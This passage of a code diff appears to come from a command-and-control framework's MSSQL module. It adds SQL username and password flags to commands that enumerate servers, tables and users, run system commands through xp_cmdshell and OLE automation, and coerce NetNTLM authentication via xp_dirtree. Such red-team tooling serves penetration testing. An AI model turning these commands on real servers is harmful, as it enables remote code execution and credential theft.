+    let bof_params = ax.bof_pack( "cstr,cstr,cstr,cstr,cstr,cstr", [server, database, linkedserver, impersonate, user, password] );
     let bof_path = ax.script_dir() + "_bin/SQL/links." + ax.arch(id) + ".o";
     let message = "Task: Enumerate linked servers";
 
@@ -431,10 +503,12 @@ _cmd_links.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
 
 
 
-var _cmd_olecmd = ax.create_command("olecmd", "Execute a system command using OLE automation procedures", "mssql olecmd [-d database] [-l linkedserver] [-i impersonate] [server] [command]");
+var _cmd_olecmd = ax.create_command("olecmd", "Execute a system command using OLE automation procedures", "mssql olecmd [-d database] [-l linkedserver] [-i impersonate] [-u user] [-p password] [server] [command]");
 _cmd_olecmd.addArgFlagString("-d", "database",     "Optional: Database to use", "");
 _cmd_olecmd.addArgFlagString("-l", "linkedserver", "Optional: Execute through linked server", "");
 _cmd_olecmd.addArgFlagString("-i", "impersonate",  "Optional: User to impersonate during execution", "");
+_cmd_olecmd.addArgFlagString("-u", "user",         "Optional: SQL username for SQL authentication", "");
+_cmd_olecmd.addArgFlagString("-p", "password",     "Optional: SQL password for SQL authentication", "");
 _cmd_olecmd.addArgString("server",  true, "SQL server to connect to");
 _cmd_olecmd.addArgString("command", true, "System command to execute via OLE automation");
 _cmd_olecmd.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
@@ -443,8 +517,10 @@ _cmd_olecmd.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
     let database     = parsed_json["database"];
     let linkedserver = parsed_json["linkedserver"];
     let impersonate  = parsed_json["impersonate"];
+    let user         = parsed_json["user"];
+    let password     = parsed_json["password"];
 
-    let bof_params = ax.bof_pack( "cstr,cstr,cstr,cstr,cstr", [server, database, linkedserver, impersonate, command] );
+    let bof_params = ax.bof_pack( "cstr,cstr,cstr,cstr,cstr,cstr,cstr", [server, database, linkedserver, impersonate, command, user, password] );
     let bof_path = ax.script_dir() + "_bin/SQL/olecmd." + ax.arch(id) + ".o";
     let message = "Task: Execute command via OLE automation";
 
@@ -453,10 +529,12 @@ _cmd_olecmd.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
 
 
 
-var _cmd_query = ax.create_command("query", "Execute a custom SQL query", "mssql query [-d database] [-l linkedserver] [-i impersonate] [server] [query]");
+var _cmd_query = ax.create_command("query", "Execute a custom SQL query", "mssql query [-d database] [-l linkedserver] [-i impersonate] [-u user] [-p password] [server] [query]");
 _cmd_query.addArgFlagString("-d", "database",     "Optional: Database to use", "");
 _cmd_query.addArgFlagString("-l", "linkedserver", "Optional: Execute through linked server", "");
 _cmd_query.addArgFlagString("-i", "impersonate",  "Optional: User to impersonate during execution", "");
+_cmd_query.addArgFlagString("-u", "user",         "Optional: SQL username for SQL authentication", "");
+_cmd_query.addArgFlagString("-p", "password",     "Optional: SQL password for SQL authentication", "");
 _cmd_query.addArgString("server", true, "SQL server to connect to");
 _cmd_query.addArgString("query",  true, "Query to execute");
 _cmd_query.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
@@ -465,8 +543,10 @@ _cmd_query.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
     let database     = parsed_json["database"];
     let linkedserver = parsed_json["linkedserver"];
     let impersonate  = parsed_json["impersonate"];
+    let user         = parsed_json["user"];
+    let password     = parsed_json["password"];
 
-    let bof_params = ax.bof_pack("cstr,cstr,cstr,cstr,cstr", [server, database, linkedserver, impersonate, query]);
+    let bof_params = ax.bof_pack("cstr,cstr,cstr,cstr,cstr,cstr,cstr", [server, database, linkedserver, impersonate, query, user, password]);
     let bof_path = ax.script_dir() + "_bin/SQL/query." + ax.arch(id) + ".o";
     let message = "Task: SQL Server custom query execution";
 
@@ -475,10 +555,12 @@ _cmd_query.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
 
 
 
-var _cmd_rows = ax.create_command("rows", "Get the count of rows in a table", "mssql rows [-d database] [-l linkedserver] [-i impersonate] [server] [table]");
+var _cmd_rows = ax.create_command("rows", "Get the count of rows in a table", "mssql rows [-d database] [-l linkedserver] [-i impersonate] [-u user] [-p password] [server] [table]");
 _cmd_rows.addArgFlagString("-d", "database",     "Optional: Database to use", "");
 _cmd_rows.addArgFlagString("-l", "linkedserver", "Optional: Execute through linked server", "");
 _cmd_rows.addArgFlagString("-i", "impersonate",  "Optional: User to impersonate during execution", "");
+_cmd_rows.addArgFlagString("-u", "user",         "Optional: SQL username for SQL authentication", "");
+_cmd_rows.addArgFlagString("-p", "password",     "Optional: SQL password for SQL authentication", "");
 _cmd_rows.addArgString("server", true, "SQL server to connect to");
 _cmd_rows.addArgString("table",  true, "Table to count rows from");
 _cmd_rows.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
@@ -487,8 +569,10 @@ _cmd_rows.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
     let database     = parsed_json["database"];
     let linkedserver = parsed_json["linkedserver"];
     let impersonate  = parsed_json["impersonate"];
+    let user         = parsed_json["user"];
+    let password     = parsed_json["password"];
 
-    let bof_params = ax.bof_pack( "cstr,cstr,cstr,cstr,cstr", [server, database, table, linkedserver, impersonate] );
+    let bof_params = ax.bof_pack( "cstr,cstr,cstr,cstr,cstr,cstr,cstr", [server, database, table, linkedserver, impersonate, user, password] );
     let bof_path = ax.script_dir() + "_bin/SQL/rows." + ax.arch(id) + ".o";
     let message =  "Task: Count rows in table";
 
@@ -497,10 +581,12 @@ _cmd_rows.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
 
 
 
-var _cmd_search = ax.create_command("search","Search a table for a column name","mssql search [-d database] [-l linkedserver] [-i impersonate] [server] [keyword]");
+var _cmd_search = ax.create_command("search","Search a table for a column name","mssql search [-d database] [-l linkedserver] [-i impersonate] [-u user] [-p password] [server] [keyword]");
 _cmd_search.addArgFlagString("-d", "database",     "Optional: Database to use", "");
 _cmd_search.addArgFlagString("-l", "linkedserver", "Optional: Execute through linked server", "");
 _cmd_search.addArgFlagString("-i", "impersonate",  "Optional: User to impersonate during execution", "");
+_cmd_search.addArgFlagString("-u", "user",         "Optional: SQL username for SQL authentication", "");
+_cmd_search.addArgFlagString("-p", "password",     "Optional: SQL password for SQL authentication", "");
 _cmd_search.addArgString("server",  true, "SQL server to connect to");
 _cmd_search.addArgString("keyword", true, "Column name keyword to search for");
 _cmd_search.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
@@ -509,8 +595,10 @@ _cmd_search.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
     let database     = parsed_json["database"];
     let linkedserver = parsed_json["linkedserver"];
     let impersonate  = parsed_json["impersonate"];
+    let user         = parsed_json["user"];
+    let password     = parsed_json["password"];
 
-    let bof_params = ax.bof_pack( "cstr,cstr,cstr,cstr,cstr", [server, database, linkedserver, impersonate, keyword] );
+    let bof_params = ax.bof_pack( "cstr,cstr,cstr,cstr,cstr,cstr,cstr", [server, database, linkedserver, impersonate, keyword, user, password] );
     let bof_path = ax.script_dir() + "_bin/SQL/search." + ax.arch(id) + ".o";
     let message =  "Task: Search for column names";
 
@@ -519,10 +607,12 @@ _cmd_search.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
 
 
 
-var _cmd_smb = ax.create_command("smb", "Coerce NetNTLM auth via xp_dirtree", "mssql smb [-d database] [-l linkedserver] [-i impersonate] [server] [\\\\listener]");
+var _cmd_smb = ax.create_command("smb", "Coerce NetNTLM auth via xp_dirtree", "mssql smb [-d database] [-l linkedserver] [-i impersonate] [-u user] [-p password] [server] [\\\\listener]");
 _cmd_smb.addArgFlagString("-d", "database",     "Optional: Database to use", "");
 _cmd_smb.addArgFlagString("-l", "linkedserver", "Optional: Execute through linked server", "");
 _cmd_smb.addArgFlagString("-i", "impersonate",  "Optional: User to impersonate during execution", "");
+_cmd_smb.addArgFlagString("-u", "user",         "Optional: SQL username for SQL authentication", "");
+_cmd_smb.addArgFlagString("-p", "password",     "Optional: SQL password for SQL authentication", "");
 _cmd_smb.addArgString("server",   true, "SQL server to connect to");
 _cmd_smb.addArgString("listener", true, "UNC path listener (e.g., \\\\host\\share)");
 _cmd_smb.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
@@ -531,8 +621,10 @@ _cmd_smb.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
     let database     = parsed_json["database"];
     let linkedserver = parsed_json["linkedserver"];
     let impersonate  = parsed_json["impersonate"];
+    let user         = parsed_json["user"];
+    let password     = parsed_json["password"];
 
-    let bof_params = ax.bof_pack( "cstr,cstr,cstr,cstr,cstr", [server, database, linkedserver, impersonate, listener] );
+    let bof_params = ax.bof_pack( "cstr,cstr,cstr,cstr,cstr,cstr,cstr", [server, database, linkedserver, impersonate, listener, user, password] );
     let bof_path = ax.script_dir() + "_bin/SQL/smb." + ax.arch(id) + ".o";
     let message = "Task: SQL Server SMB relay via xp_dirtree";
 
@@ -541,18 +633,22 @@ _cmd_smb.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
 
 
 
-var _cmd_tables = ax.create_command("tables", "Enumerate tables within a database", "mssql tables [-d database] [-l linkedserver] [-i impersonate] [server]");
+var _cmd_tables = ax.create_command("tables", "Enumerate tables within a database", "mssql tables [-d database] [-l linkedserver] [-i impersonate] [-u user] [-p password] [server]");
 _cmd_tables.addArgFlagString("-d", "database",     "Optional: Database to use", "");
 _cmd_tables.addArgFlagString("-l", "linkedserver", "Optional: Execute through linked server", "");
 _cmd_tables.addArgFlagString("-i", "impersonate",  "Optional: User to impersonate during execution", "");
+_cmd_tables.addArgFlagString("-u", "user",         "Optional: SQL username for SQL authentication", "");
+_cmd_tables.addArgFlagString("-p", "password",     "Optional: SQL password for SQL authentication", "");
 _cmd_tables.addArgString("server", true, "SQL server to connect to");
 _cmd_tables.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
     let server       = parsed_json["server"];
     let database     = parsed_json["database"];
     let linkedserver = parsed_json["linkedserver"];
     let impersonate  = parsed_json["impersonate"];
+    let user         = parsed_json["user"];
+    let password     = parsed_json["password"];
 
-    let bof_params = ax.bof_pack( "cstr,cstr,cstr,cstr", [server, database, linkedserver, impersonate] );
+    let bof_params = ax.bof_pack( "cstr,cstr,cstr,cstr,cstr,cstr", [server, database, linkedserver, impersonate, user, password] );
     let bof_path = ax.script_dir() + "_bin/SQL/tables." + ax.arch(id) + ".o";
     let message = "Task: Enumerate Tables";
 
@@ -561,18 +657,22 @@ _cmd_tables.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
 
 
 
-var _cmd_users = ax.create_command("users", "Enumerate users with database access","mssql users [-d database] [-l linkedserver] [-i impersonate] [server]");
+var _cmd_users = ax.create_command("users", "Enumerate users with database access","mssql users [-d database] [-l linkedserver] [-i impersonate] [-u user] [-p password] [server]");
 _cmd_users.addArgFlagString("-d", "database",     "Optional: Database to use", "");
 _cmd_users.addArgFlagString("-l", "linkedserver", "Optional: Execute through linked server", "");
 _cmd_users.addArgFlagString("-i", "impersonate",  "Optional: User to impersonate during execution", "");
+_cmd_users.addArgFlagString("-u", "user",         "Optional: SQL username for SQL authentication", "");
+_cmd_users.addArgFlagString("-p", "password",     "Optional: SQL password for SQL authentication", "");
 _cmd_users.addArgString("server", true, "SQL server to connect to");
 _cmd_users.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
     let server       = parsed_json["server"];
     let database     = parsed_json["database"];
     let linkedserver = parsed_json["linkedserver"];
     let impersonate  = parsed_json["impersonate"];
+    let user         = parsed_json["user"];
+    let password     = parsed_json["password"];
 
-    let bof_params = ax.bof_pack( "cstr,cstr,cstr,cstr", [server, database, linkedserver, impersonate] );
+    let bof_params = ax.bof_pack( "cstr,cstr,cstr,cstr,cstr,cstr", [server, database, linkedserver, impersonate, user, password] );
     let bof_path = ax.script_dir() + "_bin/SQL/users." + ax.arch(id) + ".o";
     let message = "Task: Enumerate users with database access";
 
@@ -581,18 +681,22 @@ _cmd_users.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
 
 
 
-var _cmd_whoami = ax.create_command("whoami", "Gather logged in user, mapped user and roles from SQL server", "mssql whoami [-d database] [-l linkedserver] [-i impersonate] [server]");
+var _cmd_whoami = ax.create_command("whoami", "Gather logged in user, mapped user and roles from SQL server", "mssql whoami [-d database] [-l linkedserver] [-i impersonate] [-u user] [-p password] [server]");
 _cmd_whoami.addArgFlagString("-d", "database",     "Optional: Database to use", "");
 _cmd_whoami.addArgFlagString("-l", "linkedserver", "Optional: Execute through linked server", "");
 _cmd_whoami.addArgFlagString("-i", "impersonate",  "Optional: User to impersonate during execution", "");
+_cmd_whoami.addArgFlagString("-u", "user",         "Optional: SQL username for SQL authentication", "");
+_cmd_whoami.addArgFlagString("-p", "password",     "Optional: SQL password for SQL authentication", "");
 _cmd_whoami.addArgString("server", true, "SQL server to connect to");
 _cmd_whoami.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
     let server       = parsed_json["server"];
     let database     = parsed_json["database"];
     let linkedserver = parsed_json["linkedserver"];
     let impersonate  = parsed_json["impersonate"];
+    let user         = parsed_json["user"];
+    let password     = parsed_json["password"];
 
-    let bof_params = ax.bof_pack("cstr,cstr,cstr,cstr", [server, database, linkedserver, impersonate]);
+    let bof_params = ax.bof_pack("cstr,cstr,cstr,cstr,cstr,cstr", [server, database, linkedserver, impersonate, user, password]);
     let bof_path = ax.script_dir() + "_bin/SQL/whoami." + ax.arch(id) + ".o";
     let message = "Task: SQL Server whoami BOF";
 
@@ -601,10 +705,12 @@ _cmd_whoami.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
 
 
 
-var _cmd_xpcmd = ax.create_command("xpcmd", "Execute a system command via xp_cmdshell", "mssql xpcmd [-d database] [-l linkedserver] [-i impersonate] [server] [command]");
+var _cmd_xpcmd = ax.create_command("xpcmd", "Execute a system command via xp_cmdshell", "mssql xpcmd [-d database] [-l linkedserver] [-i impersonate] [-u user] [-p password] [server] [command]");
 _cmd_xpcmd.addArgFlagString("-d", "database",     "Optional: Database to use", "");
 _cmd_xpcmd.addArgFlagString("-l", "linkedserver", "Optional: Execute through linked server", "");
 _cmd_xpcmd.addArgFlagString("-i", "impersonate",  "Optional: User to impersonate during execution", "");
+_cmd_xpcmd.addArgFlagString("-u", "user",         "Optional: SQL username for SQL authentication", "");
+_cmd_xpcmd.addArgFlagString("-p", "password",     "Optional: SQL password for SQL authentication", "");
 _cmd_xpcmd.addArgString("server",  true, "SQL server to connect to");
 _cmd_xpcmd.addArgString("command", true, "Command to execute via xp_cmdshell");
 _cmd_xpcmd.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
@@ -613,8 +719,10 @@ _cmd_xpcmd.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
     let database     = parsed_json["database"];
     let linkedserver = parsed_json["linkedserver"];
     let impersonate  = parsed_json["impersonate"];
+    let user         = parsed_json["user"];
+    let password     = parsed_json["password"];
 
-    let bof_params = ax.bof_pack( "cstr,cstr,cstr,cstr,cstr", [server, database, linkedserver, impersonate, command] );
+    let bof_params = ax.bof_pack( "cstr,cstr,cstr,cstr,cstr,cstr,cstr", [server, database, linkedserver, impersonate, command, user, password] );
     let bof_path = ax.script_dir() + "_bin/SQL/xpcmd." + ax.arch(id) + ".o";
     let message = "Task: SQL Server xp_cmdshell execution";
 
